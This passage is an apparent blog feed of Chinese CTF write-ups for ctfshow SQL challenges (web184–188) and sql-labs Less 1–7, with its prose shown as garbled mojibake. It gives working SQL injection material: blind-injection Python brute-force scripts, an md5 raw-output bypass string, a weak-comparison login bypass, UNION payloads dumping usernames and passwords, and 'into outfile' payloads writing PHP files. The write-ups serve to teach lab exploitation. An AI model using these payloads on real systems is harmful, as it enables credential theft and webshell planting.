class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;0x&quot;</span>+str_to_hex(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web185-186"><a href="#web185-186" class="headerlink" title="web185-186"></a>web185-186</h2><p>è¿™é¢˜è¿‡æ»¤äº†æ›´å¤šçš„ä¸œè¥¿ï¼Œç”šè‡³æŠŠæ•°å­—éƒ½è¿‡æ»¤äº†_(Â¦3ã€âˆ )_</p><p>å»æœäº†æœï¼Œåœ¨Y4å¸ˆå‚…é‚£é‡Œå‘ç°äº†ä¸€å¼ å›¾</p><p><img src="https://i.loli.net/2021/04/06/qQS6KvFXDW41uki.png"></p><p>å‘ç°å¯ä»¥ä¸Štrue</p><p>è¿™é‡Œæ˜¯è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;url_here&#x27;</span></span><br><span class="line">flagstr = <span class="string">&#x27;&#123;cqwertyuiopasdfghjklzxvbnm-0123456789&#125;&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Num</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Numstr</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&quot;chr(&quot;</span>+Num(<span class="built_in">ord</span>(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;,chr(&quot;</span>+Num(<span class="built_in">ord</span>(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">    print(<span class="string">f&quot;The number is: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(Numstr(result+j+<span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            result += j</span><br><span class="line">            print(<span class="string">f&quot;[+] Result now is: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>ç»•è¿‡md5($str,true)ï¼Œç›´æ¥ç”¨æˆ·åå¡«å†™<code>admin</code>å¯†ç ä¸º<code>ffifdyop</code></p><p>åŸç†çš„è¯åœ¨è¿™é‡Œ<a href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450">[SQLç»•è¿‡]md5($str,true)ç±»å‹ç»•è¿‡</a></p><p>ç„¶åF12æŠ“ä¸ªåŒ…å°±å¯ä»¥çœ‹åˆ°flagäº†</p><p><img src="https://i.loli.net/2021/04/06/cLivMjtPBDVw5au.png"></p><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><p>è¿™é¢˜æ˜¯çº¯çŸ¥è¯†ç›²åŒºâˆ‘(ã£Â°Ğ”Â°;)ã£</p><p>å’±ä»¬å¯ä»¥è¿™æ ·å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">0</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆå‘¢â†“</p><p>åœ¨sqlæŸ¥è¯¢æ—¶ï¼Œ<code>where username=0</code>è¿™æ ·çš„æŸ¥è¯¢ä¸­ï¼Œå› ä¸ºæ•°æ®åº“é‡Œçš„<code>username</code>éƒ½ä¼šæ˜¯å­—ç¬¦ä¸²ï¼Œè€Œåœ¨<strong>mysql</strong>ä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½ä¼šè½¬æ¢æˆæ•°å­—0ï¼Œå› æ­¤è¿™ä¸ª<code>where</code>æ¡ä»¶å¯ä»¥æŠŠæ‰€æœ‰ä»¥å­—æ¯å¼€å¤´çš„æ•°æ®æŸ¥å‡ºæ¥</p><p>è€Œ<code>passwor=0</code>åˆ™æ˜¯å› ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==intval(<span class="variable">$password</span>) <span class="comment"># å¼±ç±»å‹æ¯”è¾ƒ</span></span><br><span class="line"><span class="comment"># å› ä¸ºpassæŸ¥å‡ºæ¥çš„æ•°æ®ä¹Ÿä¼šæ˜¯ä»¥å­—æ¯å¼€å¤´çš„ï¼Œæ‰€æœ‰password=0å¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒå¾—åˆ°flag</span></span><br></pre></td></tr></table></figure><p>è€Œè¿™æ ·ä¹Ÿå¯ä»¥æŠŠä¸œè¥¿æŸ¥å‡ºæ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span>&lt;<span class="number">1</span>&amp;password=<span class="number">0</span></span><br><span class="line">username=<span class="number">1</span>||<span class="number">1</span>&amp;password=<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctfshow-SQL&quot;&gt;&lt;a href=&quot;#ctfshow-SQL&quot; class=&quot;headerlink&quot; title=&quot;ctfshow SQL&quot;&gt;&lt;/a&gt;ctfshow SQL&lt;/h1&gt;&lt;p&gt;åˆ·ä¸€åˆ·ctfshowçš„sqlé¢˜ï¼Œæå‡ä¸€ä¸‹sqlæ–¹é¢çš„ç¼ºé™·&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web" scheme="https://lucifer-rossweisse.github.io/categories/Web/"/>
    
    
    <category term="sql" scheme="https://lucifer-rossweisse.github.io/tags/sql/"/>
    
    <category term="ctfshow" scheme="https://lucifer-rossweisse.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Sql-Labs</title>
    <link href="https://lucifer-rossweisse.github.io/2021/02/07/web%E5%AD%A6%E4%B9%A0/sql-labs/"/>
    <id>https://lucifer-rossweisse.github.io/2021/02/07/web%E5%AD%A6%E4%B9%A0/sql-labs/</id>
    <published>2021-02-07T15:38:00.000Z</published>
    <updated>2021-07-23T03:27:19.148Z</updated>
    
    <content type="html"><![CDATA[<p>sql-labs-less-1-10</p><a id="more"></a><h1 id="Less-1-åŸºäºâ€™-çš„å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-1-åŸºäºâ€™-çš„å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-1-åŸºäºâ€™ çš„å­—ç¬¦å‹æ³¨å…¥"></a>Less-1-åŸºäºâ€™ çš„å­—ç¬¦å‹æ³¨å…¥</h1><p>è¿›å»åè€å¥—è·¯</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹æ³¨å…¥ç‚¹</p><blockquote><p>id=1â€™ and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/e974130e6213715867b0a5b332150a8c.png"></p><p>æŠŠ1=1æ¢æˆ1=2</p><blockquote><p>id=1â€˜  and 1=2 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/8792b518d8154c5ccc0b6e072876661d.png"></p><p>å‘ç°æ²¡æœ‰æŠ¥é”™ï¼Œä¹Ÿæ²¡æœ‰æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œè¯´æ˜å¯ä»¥ä½¿ç”¨ â€˜ å­—ç¬¦æ³¨å…¥</p><p>æŸ¥è¯¢æœ‰å¤šå°‘åˆ—</p><blockquote><p>id=1â€™ order by 4 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/642125828168fb5342d7dc127e2fccd3.png"></p><p>å‡ºç°é”™è¯¯ï¼Œè¯æ˜è¡¨ä¸­åªæœ‰ä¸‰åˆ—</p><p>åˆ¤æ–­æ˜¾ç¤ºç‚¹</p><blockquote><p>id=-1â€™ union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/2f3d76328e8ba05b0004fd749abd53a0.png"></p><p>æŸ¥è¯¢ç”¨æˆ·ï¼Œæ•°æ®åº“</p><blockquote><p>id=-1â€™ union select 1,user(),database() â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/846d30e188f1547591acea4bf8b852cf.png"></p><p>æŸ¥è¯¢ç”¨æˆ·åï¼Œå¯†ç </p><blockquote><p>id=-1â€™ union select 1,(select group_concat(concat_ws(â€˜â€”â€˜,username,password)) from users),3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/c8e1124e5d208d21bf60a1522dc9975b.png"></p><h1 id="Less-2-æ•°å­—å‹æ³¨å…¥"><a href="#Less-2-æ•°å­—å‹æ³¨å…¥" class="headerlink" title="Less-2-æ•°å­—å‹æ³¨å…¥"></a>Less-2-æ•°å­—å‹æ³¨å…¥</h1><p>ç”±æç¤ºçŸ¥é“æ˜¯æ•´æ•°å‹æ³¨å…¥</p><p>è€å¥—è·¯</p><blockquote><p>id=1 and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/2c1f549f4c118fb6be5f6aeb633b17b3.png"></p><p>å§1=1æ¢æˆ1=2</p><blockquote><p>id=1 and 1=2 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/bc45f5df67356a6296e570c0b06e27f2.png"></p><p>æ²¡æœ‰é”™è¯¯ï¼Œä¹Ÿæ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜ä¸ºæ•°å­—å‹æ³¨å…¥</p><p>æŸ¥è¯¢æœ‰å¤šå°‘åˆ—</p><blockquote><p>id=1 order by 4 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/7a7b987b06c113264fc76ff59bdab201.png"></p><p>æŸ¥è¯¢æ˜¾ç¤ºç‚¹</p><blockquote><p>id=-1 union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/4ebec5db0104a132a7b042c371f940e2.png"></p><p>æŸ¥è¯¢ç”¨æˆ·åï¼Œå¯†ç </p><blockquote><p>id=-1 union select 1,(select group_concat(concat_ws(â€œâ€”â€œ,username,password)) from users),3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/74bfa2cfcb47bb7ad33d3a418d4baee6.png"></p><h1 id="Less-3-åŸºäºâ€™-çš„å­—ç¬¦æ³¨å…¥"><a href="#Less-3-åŸºäºâ€™-çš„å­—ç¬¦æ³¨å…¥" class="headerlink" title="Less-3-åŸºäºâ€™) çš„å­—ç¬¦æ³¨å…¥"></a>Less-3-åŸºäºâ€™) çš„å­—ç¬¦æ³¨å…¥</h1><p>æç¤ºæ˜¯å¼¯æ›²çš„å­—ç¬¦ï¼Œå¯ä»¥çŒœæµ‹å¯èƒ½æ˜¯ ) å­—ç¬¦æ³¨å…¥</p><p>å¯ä»¥ç›´æ¥å»çœ‹ä»£ç éªŒè¯</p><p><img src="https://img-blog.csdnimg.cn/img_convert/1bb2bca05087136a3b13a39703a6473e.png"></p><p>çŸ¥é“äº†æ³¨å…¥ç‚¹ï¼Œå°±å¼€å§‹è€å¥—è·¯</p><p>æŸ¥è¯¢åˆ—æ•°</p><blockquote><p>id=1â€™) order by 4 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/d04a6ee5cdd6fc1d6c785871071abe8b.png"></p><p>æŸ¥è¯¢æ˜¾ç¤ºç‚¹</p><blockquote><p>id=-1â€™) union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/468064452acf79cc9c0725801c5ff326.png"></p><p>æŸ¥è¯¢ç”¨æˆ·åï¼Œå¯†ç </p><blockquote><p>id=-1â€™) union select 1,(select group_concat(concat_ws(â€œâ€”â€œ,username,password)) from users),3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/e4e3ad10e7ba5a5a956ddc82f8c0c100.png"></p><h1 id="Less-4-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-4-åŸºäºâ€-çš„å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-4-åŸºäºâ€) çš„å­—ç¬¦å‹æ³¨å…¥"></a>Less-4-åŸºäºâ€) çš„å­—ç¬¦å‹æ³¨å…¥</h1><p>æ ¹æ®æç¤ºå¯ä»¥çŸ¥é“ï¼Œè¿™é¢˜æ˜¯åŒå¼•å·å­—ç¬¦æ³¨å…¥<br>æµ‹è¯•æ³¨å…¥ç‚¹ï¼Œåˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯åªæœ‰åŒå¼•å·çš„æ³¨å…¥ç‚¹</p><blockquote><p>id=1â€ and 1=1 â€“+</p></blockquote><p>ç»“æœæç¤ºé”™è¯¯äº†<br><img src="https://img-blog.csdnimg.cn/20210206112347169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">äºæ˜¯æˆ‘å°±çŒœæµ‹å¯èƒ½æ˜¯åŒ…æ‹¬äº†ä¸Šä¸€é¢˜çš„ ) å­—ç¬¦æ³¨å…¥ç‚¹ï¼Œåœ¨åé¢åŠ ä¸ª )</p><blockquote><p>id=1â€) and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206112458418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æœ‰ååº”äº†ï¼Œç»§ç»­æµ‹è¯•</p><blockquote><p>id=1â€) and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206112557663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æ²¡æœ‰æç¤ºé”™è¯¯ä¹Ÿæ²¡æœ‰å›æ˜¾ï¼Œè¯´æ˜æ³¨å…¥ç‚¹æ­£ç¡®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€å¥—è·¯äº†</p><blockquote><p>id=1â€) order by 4 â€“+ //æŸ¥è¯¢åˆ—<br>id=-1â€) union select 1,2,3 â€“+ //æŸ¥è¯¢æ˜¾ç¤ºç‚¹<br>id=-1â€) union select 1,(select group_concat(concat_ws(â€œâ€”â€œ,username,password)) from users),3 â€“+ //æŸ¥è¯¢ç”¨æˆ·åï¼Œå¯†ç </p></blockquote><p>æœ€ç»ˆç»“æœ<br><img src="https://img-blog.csdnimg.cn/20210206112921881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-5-åŸºäºâ€™-çš„æŠ¥é”™æ³¨å…¥"><a href="#Less-5-åŸºäºâ€™-çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-5-åŸºäºâ€™ çš„æŠ¥é”™æ³¨å…¥"></a>Less-5-åŸºäºâ€™ çš„æŠ¥é”™æ³¨å…¥</h1><p>é¢˜ç›®åˆšå¼€å§‹ç»™äº†ä¸ªdouble queryçš„æç¤ºï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡è§ï¼Œæ²¡æ˜ç™½æ˜¯å•¥æ„æ€ã€‚<br>å°±å¼€å§‹å¸¸è§„çš„æµ‹è¯•ä¸€ä¸‹æ³¨å…¥ç‚¹</p><blockquote><p>id=1â€™ and 1=1 â€“+<br>id=1â€™ and 1=2 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120620545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20210206120634918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">å‘ç°å­—ç¬¦æ³¨å…¥å¯è¡Œï¼ŒæŸ¥è¯¢ä¸€ä¸‹åˆ—æ•°</p><blockquote><p>id=1â€™ order by 4 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120737992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">ç„¶åæŸ¥æ˜¾ç¤ºç‚¹çš„æ—¶å€™ï¼Œå‘ç°ä¸€ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œé¢˜ç›®æ²¡æœ‰ç»™å‡ºæ˜¾ç¤ºç‚¹</p><blockquote><p>id=-1â€™ union select 1,2,3 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206120858544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">è¿˜æ²¡è§è¿‡è¿™ç§ç±»å‹é¢˜ï¼Œäºæ˜¯å»çœ‹äº†çœ¼æºç <br><img src="https://img-blog.csdnimg.cn/20210206184538545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>åœ¨è¿™çœ‹åˆ°ä¼šè¾“å‡ºmysql_error()<br>æ‰€ä»¥æƒ³åˆ°äº†æŠ¥é”™æ³¨å…¥ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œæ‰€ä»¥å»æ‰¾äº†æ‰¾æŠ¥é”™æ³¨å…¥å’‹æ<br>å‘ç°å¯ä»¥updatexml()æ³¨å…¥</p><blockquote><p>id=-1â€™ union select updatexml(1,concat(0x7e,user(),0x7e),1) â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210206185449491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h2 id="updatexml-è¯­æ³•"><a href="#updatexml-è¯­æ³•" class="headerlink" title="updatexml()è¯­æ³•"></a>updatexml()è¯­æ³•</h2><p>updatexml()ï¼š(XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</p><p>å…¶å®ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥éšæ„å¡«å†™</p><h1 id="Less-6-åŸºäºâ€-çš„æŠ¥é”™æ³¨å…¥"><a href="#Less-6-åŸºäºâ€-çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-6-åŸºäºâ€ çš„æŠ¥é”™æ³¨å…¥"></a>Less-6-åŸºäºâ€ çš„æŠ¥é”™æ³¨å…¥</h1><p>ä¸ä¸Šä¸€é¢˜åŒæ ·æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹å˜ä¸ºäº† â€œ </p><blockquote><p>id=-1â€ union select updatexml(1,concat(user()),1) â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207103757424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"></p><h1 id="Less-7-æ–‡ä»¶è¯»å†™"><a href="#Less-7-æ–‡ä»¶è¯»å†™" class="headerlink" title="Less-7-æ–‡ä»¶è¯»å†™"></a>Less-7-æ–‡ä»¶è¯»å†™</h1><p>è¿›å…¥é¢˜ç›®å‘ç°æç¤ºæ˜¯Dump into Outfileï¼Œè¯´æ˜è¦ç”¨åˆ°æ–‡ä»¶çš„è¯»å†™</p><h2 id="tipsï¼š"><a href="#tipsï¼š" class="headerlink" title="tipsï¼š"></a>tipsï¼š</h2><p>mysqlçš„æ–‡ä»¶è¯»å†™å‡½æ•°<strong>load_file</strong>å‡½æ•°ä¸<strong>into outfile</strong>å‡½æ•°åªæœ‰æ»¡è¶³ä»¥ä¸‹æ¡ä»¶å¯ä»¥ä½¿ç”¨:</p><blockquote><p>å½“å‰è¿æ¥çš„mysqlç”¨æˆ·ä¸ºrootæƒé™<br>æ–‡ä»¶æƒé™: chmod a+x pathtofile<br>æ–‡ä»¶å¤§å°: å¿…é¡»å°äºmax_allowed_packet</p></blockquote><p>æ–‡ä»¶çš„è¯»å†™ä¸€èˆ¬æ˜¯è¦é€šè¿‡mysqlé…ç½®æ–‡ä»¶çš„æƒé™æ‰å¯ä»¥ä½¿ç”¨çš„ï¼Œ5.5ä¹‹å‰çš„ç‰ˆæœ¬æ˜¯secure_file_privå˜é‡ é»˜è®¤ä¸ºç©º æ‰€ä»¥ç›´æ¥å°±å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯é«˜äº5.5æ—¶mysqlæ–°å‡ºäº†ä¸€ä¸ªsecure-file-privå­—æ®µ<br>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´æ”¹ä¸€ä¸‹mysqlçš„é…ç½®æ–‡ä»¶ï¼ŒåŠ ä¸€è¡Œ</p><blockquote><p>secure_file_priv= </p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207160905713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70"><br>ç„¶åé‡å¯ä¸€ä¸‹mysqlå°±å¯ä»¥äº†ã€‚(tipsç»“æŸ<br>è¿›å…¥é¢˜ç›®åè€æ–¹æ³•</p><blockquote><p>id=1â€™ and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161123726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æŠ¥é”™äº†ï¼Œæµ‹è¯•äº†ä¸€ä¼šåå‘ç°æ˜¯è¿™æ ·é—­åˆçš„</p><blockquote><p>id=1â€™)) and 1=1 â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161223667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">æç¤ºä½¿ç”¨outfile()å‡½æ•°<br>äºæ˜¯æˆ‘ä»¬æ„é€ ä¸€ä¸ªpayload</p><blockquote><p>id=-1â€™)) union select 1,â€™è¿™æ˜¯æ”¾æœ¨é©¬çš„â€™,3 into outfile â€˜D:\1.phpâ€™ â€“+</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210207161431162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNTAxNzM5,size_16,color_FFFFFF,t_70">è¿›Dç›˜æŸ¥çœ‹æ–‡ä»¶åœ¨ä¸åœ¨<br><img src="https://img-blog.csdnimg.cn/2021020716160698.png"><br>ç„¶åå†™ä¸ªæœ¨é©¬è¿›å»æŸ¥çœ‹ç”¨æˆ·åå’Œå¯†ç è¯•è¯•</p><blockquote><p>id=-1â€™)) union select 1,(select group_concat(concat_ws(â€œâ€”â€œ,username,password)) from users),3 into outfile â€˜D:\2.phpâ€™ â€“+</p></blockquote><p><img 